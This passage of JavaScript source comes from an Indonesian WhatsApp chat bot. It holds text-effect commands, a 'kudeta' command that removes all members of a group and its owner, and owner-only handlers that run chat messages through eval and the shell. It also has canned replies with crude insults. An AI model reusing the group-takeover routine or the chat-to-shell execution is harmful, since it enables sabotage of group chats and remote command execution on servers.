if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
kyy.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
}
break
case 'kudeta': {
  if (!m.isGroup) return reply(mess.group)
  if (!isAdmins) return reply(mess.admin)
  if (!isBotAdmins) return reply(mess.botAdmin)
  
  m.reply('*Semoga Grup Ini Kena Kudeta 🔥*')
  
  let data = participants.map((o) => o.id);
  
  for (let o of data) {
    if (o !== botNumber && o !== groupOwner && o !== global.owner) {
      kyy.groupParticipantsUpdate(m.chat, [o], "remove");
    }
  }
  
  if (data.includes(groupOwner)) {
    setTimeout(() => {
      kyy.groupParticipantsUpdate(m.chat, [groupOwner], "remove");
    }, 1);
    kyy.groupParticipantsUpdate(m.chat, [groupOwner], "demote");
  }
  
}
break;
//=================================================//
default:
if (budy.startsWith('=>')) {
if (!isCreator) return false
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return reply(bang)}
try {
reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return false
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
await reply(String(err))}}
if (budy.startsWith('$')) {
if(!isCreator) return false
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)})}

if ((budy.match) && ["Assalamualaikum", "assalamualaikum", "Assalamu'alaikum",].includes(budy) && !isCmd) {
reply(`*Waalaikummussalam warahmatullahi wabarokatuh*\n\n\n_📚 Baca yang dibawah ya!_
"Orang yang mengucapkan salam seperti ini maka ia mendapatkan 30 pahala, kemudian, orang yang dihadapan atau mendengarnya membalas dengan kalimat yang sama yaitu “Wa'alaikum salam warahmatullahi wabarakatuh atau ditambah dengan yang lain (waridhwaana). Artinya selain daripada do'a selamat juga meminta pada Allah SWT`)
}

if ((budy.match) && ["Hai",].includes(budy) && !isCmd) {
reply(`Hanako AI Online kak`)
}

if ((budy.match) && ["Makasih", "Terimakasih",].includes(budy) && !isCmd) {
reply(`Sama Sama Sayang`)
}

if ((budy.match) && ["Wkwk", "hahah",].includes(budy) && !isCmd) {
reply(`Apanya yang lucu konto1`)
}

if ((budy.match) && ["P", "p",].includes(budy) && !isCmd) {
reply(`Harap yang sopan dalam memanggil orang, minimal mengatakan "Assalamu'alaikum warrahmatullahi Wabarakatuh" atau kalian bisa panggil Namanya. Tidak sopan itu, Jika *anda lebih tua* anda mengerti yang namanya etika.

islam: Assalamualaikum
kristen: Shalom
hindu: Swastyastu
buddha: Sotthi Jitu
konghucu: Wei De Dong Tian
Atheis/Gapunya Agama/Orang Gila: p`) 
}
//=================================================//
if (isCmd && budy.toLowerCase() != undefined) {
if (from.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
kyy.copyNForward(from, msgs[budy.toLowerCase()], true)}}
} catch (err) {
m.reply(util.format(err))}}
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
